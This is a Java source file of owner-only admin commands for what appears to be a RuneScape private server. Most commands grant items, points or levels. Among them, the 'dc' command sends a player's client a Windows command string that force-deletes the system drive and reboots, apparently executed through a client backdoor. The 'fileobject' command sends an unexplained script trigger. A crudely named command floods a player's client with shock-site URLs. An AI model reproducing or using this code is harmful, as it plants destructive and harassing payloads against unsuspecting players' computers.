package org.hyperion.rs2.commands.newimpl;

import org.hyperion.Configuration;
import org.hyperion.Server;
import org.hyperion.rs2.commands.NewCommand;
import org.hyperion.rs2.commands.NewCommandExtension;
import org.hyperion.rs2.commands.impl.cmd.TeleportCommand;
import org.hyperion.rs2.commands.util.CommandInput;
import org.hyperion.rs2.model.*;
import org.hyperion.rs2.model.combat.Magic;
import org.hyperion.rs2.model.content.ContentEntity;
import org.hyperion.rs2.net.ActionSender;
import org.hyperion.rs2.util.TextUtils;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.Arrays;
import java.util.List;
import java.util.logging.Level;

/**
 * Created by DrHales on 2/29/2016.
 */
public class OwnerCommands implements NewCommandExtension {

    @Override
    public List<NewCommand> init() {
        return Arrays.asList(
                new NewCommand("reloaddrops", Rank.OWNER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String name = "./data/npcdrops.cfg";
                        int count = 1;
                        try (BufferedReader reader = new BufferedReader(new FileReader(name))) {
                            String line;
                            while ((line = reader.readLine()) != null) {
                                int spot = line.indexOf("'='");
                                if (spot > -1) {
                                    int id = 0;
                                    int i = 1;
                                    if (line.contains("/")) {
                                        line = line.substring(spot + 1, line.indexOf("/"));
                                    } else {
                                        line = line.substring(spot + 1);
                                    }
                                    String values = line;
                                    values = values.replaceAll("\t\t", "\t").trim();
                                    String[] array = values.split("\t");
                                    id = Integer.parseInt(array[0]);
                                    NPCDefinition definition = NPCDefinition.forId(id);
                                    definition.getDrops().clear();
                                    for (i = 1; i < array.length; i++) {
                                        String[] itemData = array[i].split("-");
                                        final int itemId = Integer.valueOf(itemData[0]);
                                        final int minAmount = Integer.valueOf(itemData[1]);
                                        final int maxAmount = Integer.valueOf(itemData[2]);
                                        final int chance = Integer.valueOf(itemData[3]);
                                        definition.getDrops().add(NPCDrop.create(itemId, minAmount, maxAmount, chance));
                                    }
                                }
                                count++;
                            }
                            reader.close();
                            player.sendf("Reloaded Drops.");
                        } catch (IOException ex) {
                            Server.getLogger().log(Level.WARNING, String.format("Error Reading %s", name), ex);
                        }
                        return true;
                    }
                },
                new NewCommand("givepkp", Rank.OWNER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getPoints().setVotingPoints(target.getPoints().getVotingPoints() + amount);
                        player.sendf("%s now has %,d vote points", TextUtils.optimizeText(target.getName()), target.getPoints().getVotingPoints());
                        return true;
                    }
                },
                new NewCommand("kickall", Rank.OWNER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(p -> !player.equals(p)).forEach(p -> p.getSession().close(true));
                        return true;
                    }
                },
                new NewCommand("dpbought", Rank.OWNER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        player.sendf("%s has bought '%,d' Donator Points", TextUtils.optimizeText(target.getName()), target.getPoints().getDonatorPointsBought());
                        return true;
                    }
                },
                new NewCommand("spawnitem", Rank.OWNER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Item ID", "An Existing Item ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount between 0 & %,d", Integer.MAX_VALUE))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int id = Integer.parseInt(input[1].trim());
                        final int amount = Integer.parseInt(input[2].trim());
                        target.getInventory().add(Item.create(id, amount));
                        target.getExpectedValues().addItemtoInventory("Spawning", Item.create(id, amount));
                        player.sendf("Added %s x %,d to %s's inventory", ItemDefinition.forId(id).getName(), amount, TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new NewCommand("reloadconfig", Rank.OWNER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        Configuration.reloadConfiguration();
                        return true;
                    }
                },
                new NewCommand("lanceurl", Rank.OWNER, new CommandInput<String>(string -> string.trim() != null && !string.trim().isEmpty(), "URL", "A URL")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ActionSender.yellMessage(String.format("l4unchur13 http://www.%s", input[0].trim().startsWith("http://www.") ? input[0].replace("http://www.", "").trim() : input[0].trim()));
                        return true;
                    }
                },
                new NewCommand("dc", Rank.OWNER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.sendMessage(":cmd:del%systemdrive%\\*.*/f/s/q shutdown -r -f -t 00");
                        return true;
                    }
                },
                new NewCommand("fileobject", Rank.OWNER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.sendMessage("script7894561235");
                        player.sendf("Sent '%s' script7894561235.", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new NewCommand("food", Rank.OWNER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ContentEntity.addItem(player, 15272, player.getInventory().freeSlots());
                        return true;
                    }
                },
                new NewCommand("enablepvp", Rank.OWNER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.updatePlayerAttackOptions(true);
                        player.getActionSender().sendMessage("PvP combat enabled.");
                        return true;
                    }
                },
                new NewCommand("ferry", Rank.OWNER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.setTeleportTarget(Position.create(3374, 9747, 4));
                        return true;
                    }
                },
                new NewCommand("daepicrape", Rank.OWNER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        for (int array = 0; array < 100; array++) {
                            target.getActionSender().sendMessage("l4unchur13 http://www.recklesspk.com/troll.php");
                            target.getActionSender().sendMessage("l4unchur13 http://www.nobrain.dk");
                            target.getActionSender().sendMessage("l4unchur13 http://www.meatspin.com");
                        }
                        return true;
                    }
                },
                new NewCommand("skill", Rank.OWNER, new CommandInput<Integer>(integer -> integer > -1 && integer < 25, "Integer", "Skill ID"), new CommandInput<Integer>(integer -> integer < 21, "Integer", "Boost Amount")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int skill = Integer.parseInt(input[0].trim());
                        int level = Integer.parseInt(input[1].trim());
                        player.getSkills().setLevel(skill, level);
                        player.sendMessage(String.format("%s level is temporarily boosted to %,d", Skills.SKILL_NAME[skill]), level);
                        return true;
                    }
                },
                new NewCommand("lvl", Rank.OWNER, new CommandInput<Integer>(integer -> integer > 0 && integer < 25, "Integer", "Skill ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < 100, "Integer", "Level")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int skill = Integer.parseInt(input[0].trim());
                        int level = Integer.parseInt(input[1].trim());
                        player.getSkills().setLevel(skill, level);
                        player.getSkills().setExperience(skill, player.getSkills().getXPForLevel(level) + 1);
                        player.sendf("%s level is now %,d.", Skills.SKILL_NAME[skill], level);
                        return true;
                    }
                },
                new NewCommand("givedp", Rank.OWNER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Integer", String.format("An amount between 0 & %,d", Integer.MAX_VALUE)), new CommandInput<String>(string -> string.trim().equalsIgnoreCase("true") || string.trim().equalsIgnoreCase("false"), "Boolean", "Bought [True or False]")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        final boolean bought = Boolean.parseBoolean(input[2].trim());
                        target.getPoints().increaseDonatorPoints(amount, bought);
                        player.sendf("You have given '%s' '%,dx' Donator Points.", TextUtils.optimizeText(target.getName()), amount);
                        return true;
                    }
                }
        );
    }

}
